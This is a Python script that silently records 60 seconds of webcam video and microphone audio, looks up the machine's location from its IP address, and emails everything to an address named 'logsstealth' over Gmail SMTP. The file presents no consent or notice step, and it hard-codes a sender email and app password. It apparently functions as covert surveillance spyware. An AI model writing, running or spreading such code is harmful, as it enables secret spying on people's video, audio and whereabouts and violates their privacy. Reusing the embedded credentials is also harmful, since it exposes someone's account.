import requests
import cv2
import threading
import wave
import pyaudio
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Define directories for video and audio
VIDEO_FOLDER = "videos"
RECORDED_AUDIO_FOLDER = "recorded_audio"

# Create directories if they do not exist
os.makedirs(VIDEO_FOLDER, exist_ok=True)
os.makedirs(RECORDED_AUDIO_FOLDER, exist_ok=True)

def get_location():
    """Get the current geographical location based on the public IP address."""
    try:
        response = requests.get('http://ipinfo.io')
        data = response.json()
        
        location = data.get('loc')
        city = data.get('city', 'Unknown City')
        region = data.get('region', 'Unknown Region')
        country = data.get('country', 'Unknown Country')
        
        if location:
            lat, lon = location.split(',')
            location_name = f"{city}, {region}, {country}"
            return (float(lat), float(lon), location_name)
        else:
            return None
    except Exception as e:
        print(f"Error getting location: {e}")
        return None

def capture_video(filename, duration):
    """Capture video from the webcam and save it to a file."""
    video_capture = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(f"{VIDEO_FOLDER}/{filename}.avi", fourcc, 20.0, (640, 480))

    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = video_capture.read()
        if ret:
            out.write(frame)
        else:
            break

    video_capture.release()
    out.release()
    print(f"Video saved as {VIDEO_FOLDER}/{filename}.avi")

def record_audio(filename, duration):
    """Record audio from the microphone and save it to a file."""
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100

    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format, channels=channels, rate=fs, input=True, frames_per_buffer=chunk)

    frames = []

    start_time = time.time()
    while int(time.time() - start_time) < duration:
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(f"{RECORDED_AUDIO_FOLDER}/{filename}", 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))

    print(f"Audio saved as {RECORDED_AUDIO_FOLDER}/{filename}")

def save_location_to_file(location):
    """Save the location information to a text file."""
    location_file_path = os.path.join(VIDEO_FOLDER, "location.txt")
    with open(location_file_path, 'w') as f:
        f.write(location)
    return location_file_path

def alert_with_attachments(video_filename, audio_filename, location_filename=None):
    """Send an alert with video and audio file attachments."""
    sender_email = "lalithaditya3429@gmail.com"
    receiver_email = "logsstealth@gmail.com"
    password = "hrva pjdb anpx mnay"

    # Create a multipart message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Alert: Captured Video and Audio"

    # Attach the video file
    attach_file(msg, video_filename)
    # Attach the audio file
    attach_file(msg, audio_filename)
    # Attach the location file if it exists
    if location_filename:
        attach_file(msg, location_filename)

    try:
        # Set up the server
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()  # Enable security
            server.login(sender_email, password)  # Log in to your email account
            server.send_message(msg)  # Send the message
        print("Alert sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def attach_file(msg, filename):
    try:
        if os.path.exists(filename):
            with open(filename, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filename)}')
                msg.attach(part)
        else:
            print(f"File not found: {filename}")
    except Exception as e:
        print(f"Error attaching file {filename}: {e}")

def capture_simultaneously(duration=60):
    """Capture video and audio simultaneously for the specified duration."""
    video_file = 'simultaneous_video'
    audio_file = f"{video_file}_audio.wav"

    # Start video and audio capture in separate threads
    video_thread = threading.Thread(target=capture_video, args=(video_file, duration))
    audio_thread = threading.Thread(target=record_audio, args=(audio_file, duration))

    video_thread.start()
    audio_thread.start()

    video_thread.join()
    audio_thread.join()

    # Construct full paths for the captured files
    video_file_path = os.path.join(VIDEO_FOLDER, f"{video_file}.avi")
    audio_file_path = os.path.join(RECORDED_AUDIO_FOLDER, audio_file)

    # Get the current location
    location = get_location()
    location_msg = ""
    if location:
        lat, lon, location_name = location
        location_msg = f"Location: {location_name} (Lat: {lat}, Lon: {lon})"
        LOCATION_FILE = save_location_to_file(location_msg)  # Save to a file
    else:
        LOCATION_FILE = None

    # Sending alert with files and location info
    if LOCATION_FILE:
        alert_with_attachments(video_file_path, audio_file_path, LOCATION_FILE)
    else:
        alert_with_attachments(video_file_path, audio_file_path)

if __name__ == "__main__":
    capture_simultaneously(duration=60)  # Capture for 60 seconds
